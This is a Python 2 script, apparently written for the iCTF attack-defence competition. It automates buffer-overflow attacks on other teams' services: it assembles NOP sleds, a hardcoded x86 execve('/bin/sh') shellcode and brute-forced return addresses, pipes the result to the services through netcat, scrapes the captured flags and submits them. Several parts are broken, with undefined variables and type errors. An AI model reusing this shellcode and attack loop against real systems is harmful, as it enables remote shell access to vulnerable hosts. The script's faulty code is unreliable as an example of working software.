import sys
import threading
import os
import subprocess
import multiprocessing
from ictf import iCTF


varList=[]
varDict={}
varIndexDict={}
serviceList=[]

    
def generateFinalCommandList(commandList,typeReq):
    
    global varDict,varIndexDict
    
    #print varDict
    #print commandList
    
    if(typeReq):
        for i in range(len(commandList)):
            indexVar = commandList[i].find("$")
            if(commandList[i]!='' and (commandList[i][indexVar+1]!='_') and indexVar>=0 and varDict[commandList[i][indexVar:]]):
                    varIndexDict[commandList[i][indexVar:]]=i
                    commandList[i]=commandList[i][:indexVar]+varDict[commandList[i][indexVar:]]
                    
    else:
        for i in range(len(commandList)):
            indexVar = commandList[i].find("$")
            if(commandList[i]!='' and (commandList[i][indexVar+1]=='_') and indexVar>=0 and varDict[commandList[i][indexVar:]]):
                    varIndexDict[commandList[i][indexVar:]]=i
                    commandList[i]=commandList[i][:indexVar]+varDict[commandList[i][indexVar:]]
                   
    
    return commandList



def computeShellcode(shellcode):
    global varDict
   
    #Here we will compute shell code integrating c prog
    varDict['$shellcode']="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80" 

    
    
def commandToAttack(args):
    global varDict
    #print args
    #print varDict
    
    #replace service var starting with $_
    for i in range(len(args)):
        indexVar = args[i].find('$')
        
        if(indexVar>=0 and args[i][indexVar+1]=='_'):
            varDict[args[i]]=raw_input("Enter Service Variable '"+args[i]+"' : ")
    
    commandList = generateFinalCommandList(args,0)
    finalCommand=""
    

    
    for i in range(len(commandList)):
        finalCommand+=commandList[i]+" "
    
    return finalCommand

    

#****** Instructions for attack command input ********
#all var must start with $
#if var starts with $_ then its a service var
#sample command "30*$nop $shellcode 40*$nop $address"
#shellcode must be in variable $shellcode
attackCommand = raw_input("Enter the attack command: ")

commandList = attackCommand.split(" ")
#print commandList

for i in range(len(commandList)):
    indexVar = commandList[i].find("$")
    if(commandList[i]!='' and (commandList[i][indexVar+1])!='_' and indexVar>=0 and commandList[i][indexVar:] not in varList):
        varList.append(commandList[i][indexVar:])
        
if(varList):
    varDict={}
    for i in range(len(varList)):
        varDict[varList[i]]=raw_input(varList[i]+" : ")
         
    #print varDict
    
#print commandList

#Checking whether shellcode var there in the list of args
if('$shellcode' in varDict):
    computeShellcode(varDict['$shellcode']);
    
        
commandList = generateFinalCommandList(commandList,1)
finalCommandStr = commandToAttack(commandList)

print varIndexDict
print commandList


#*********************** Service Attack Methods ***************
ourTeamNum=1
teams = 40
tick=5
"""i = iCTF("http://52.34.158.221/")
t = i.login("team"+ourTeamNum+"@example.com","password")
serviceList=t.get_service_list()"""


def generateHexCombo(address):
    global varDict
    i=address

    if("$nop" in varDict):
        count=int(varDict["$nop"])
    while count:
        yield "{:010X}".format(i)
        i+=1
        count-=1
        

def attackTeams(command,teamNum):
    global serviceList,t,commandList,varDict,varIndexDict
    print "********* Attacking **********",teamNum,(varDict["$address"]),type(varDict["$address"])   
    
    #hex_int = int(hex_str, 16)
    
    if("$address" in varDict):
        for s in generateHexCombo(int(varDict["$address"], 16)):
                addr = '0x'+str(s)
                #print addr
                #addr='0x'+varDict["$address"]
                rearrangedAddr=""
                for i in range(len(addr)-1,1,-2):
                    rearrangedAddr+='\\x'+addr[i-1]+addr[i]
     
                varDict["$address"]=rearrangedAddr
                commandList[varIndexDict["$address"]]=rearrangedAddr
                
                finalCommandStr = commandToAttack(commandList)
                print finalCommandStr
                
                getFlags(finalCommandStr,teamNum)
        

def getFlags(command,teamNum):
    global serviceList,flagsList,t,serviceId
    flagList=[]
    result=[]
    
    #catpured flags will be subnitted
    #print serviceList
    #print os.system("echo 'X' '1492930308' | xargs -n 1 | nc team2 " + str(serviceList[1]['port']))
    #flagId = t.get_targets(serviceId)
    flagId=1082042629
    #Here we need to pass shell code in echo
    """
    proc=subprocess.Popen("echo 'R' " + flagId + " '`python -c \"print " + shellcode + " \"`'" + " | xargs -n 1 | nc team"+teamNum + str(serviceList[serviceNum]['port']), shell=True, stdout=subprocess.PIPE,)"""
        
    proc=subprocess.Popen(command + "team"+serviceList[teamNum][team_id] + str(serviceList[serviceNum]['port']), shell=True, stdout=subprocess.PIPE,)
        
    
    output=proc.communicate()[0]
    print output

    result = output.split(" ")

    for i in range(0,len(result)):
        try:
            print result[i].index('FLG')
            flagList=(result[i].split('\n'))
            for j in range(0,len(flagList)):
                if(flagList[j]!=''):
                    flagsList.append(flagList[j])
                    
                    
                    
        except:
             continue
                
                
           
    print flagsList
    print t.submit_flag(flagsList)


                

#************************ gets Services after every tick ***************************
def getServiceList():
    global serviceList,t
    
    flagsList = []
    
    #serviceList=t.get_service_list()
    
    serviceList=[{u'flag_id_description': u'Flags are identified by the note name.', u'description': u'Password-protected note storage service in C.', u'service_name': u'sample_c', u'team_id': 0, u'state': u'enabled', u'upload_id': 1, u'authors': u'UCSB', u'service_id': 10001, u'port': 20001}, {u'flag_id_description': u'Flags are identified by the note name.', u'description': u'Password-protected note storage service in Python.', u'service_name': u'sample_py', u'team_id': 0, u'state': u'enabled', u'upload_id': 2, u'authors': u'The iCTF team 2016', u'service_id': 10002, u'port': 20002}, {u'flag_id_description': u'Flags are identified by the note name.', u'description': u'Password-protected note storage service for the web.', u'service_name': u'sample_web', u'team_id': 0, u'state': u'enabled', u'upload_id': 3, u'authors': u'UCSB', u'service_id': 10003, u'port': 20003}]
    
    #flagId = t.get_targets(serviceId)
    
    #print serviceList
    
    threading.Timer(tick, getServiceList).start()

#Working for multiple teams and commented just to test for one team only !! Dont delete this !!!
"""def f(teamNum):
    global ourTeamNum
    if((teamNum+1)!=ourTeamNum):
        print(multiprocessing.current_process())
        print teamNum+1
        attackTeams(finalCommandStr,teamNum+1)

p = multiprocessing.Pool(processes=5)
p.map(f,range(teams))"""

#To attack one team only just for testing
getServiceList()
attackTeams(finalCommandStr,2)
